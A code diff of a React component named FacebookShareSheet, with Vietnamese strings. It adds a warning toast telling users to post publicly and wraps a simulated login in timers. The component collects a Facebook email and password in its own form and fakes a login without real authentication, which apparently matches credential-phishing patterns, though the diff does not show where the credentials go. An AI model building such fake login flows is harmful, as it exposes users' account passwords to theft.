@@ -22,6 +22,7 @@ export default function FacebookShareSheet({ open, onOpenChange, selectedGroups,
   const [isLoading, setIsLoading] = useState(false);
   const [shareGroups, setShareGroups] = useState<Array<{ id: string; name: string; region?: string; image?: string }>>([]);
 
+
   // Chuẩn hoá danh sách id
   const selectedIds = useMemo(
     () => (Array.isArray(selectedGroups)
@@ -84,14 +85,25 @@ export default function FacebookShareSheet({ open, onOpenChange, selectedGroups,
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
-    if (email && password) {
+    if (!email || !password) return;
+    
+    // Hiển thị toast cảnh báo
+    toast.warning('Lưu ý quan trọng!', {
+      description: 'Quý khách vui lòng để bài viết được đăng CÔNG KHAI trên trang cá nhân. Không khoá trang cá nhân hoặc để chế độ bạn bè. Tránh không share được bài viết!',
+      duration: 5000,
+    });
+    
+    // Đăng nhập sau 1 giây
+    setTimeout(() => {
       setIsLoading(true);
       setTimeout(() => {
         setStep('share');
         setIsLoading(false);
       }, 3000);
-    }
+    }, 1000);
   };
+
+
 
   const handleShare = async () => {
     if (!postContent.trim()) {
@@ -186,7 +198,8 @@ export default function FacebookShareSheet({ open, onOpenChange, selectedGroups,
         onClick={handleClose}
         style={{ animation: 'fadeIn 0.3s ease-out' }}
       />
-      
+
+
       {/* Drawer Content */}
       <div 
         className="fixed inset-x-0 bottom-0 z-50 max-h-[90vh] flex flex-col bg-white rounded-t-2xl border-t max-w-[430px] mx-auto"
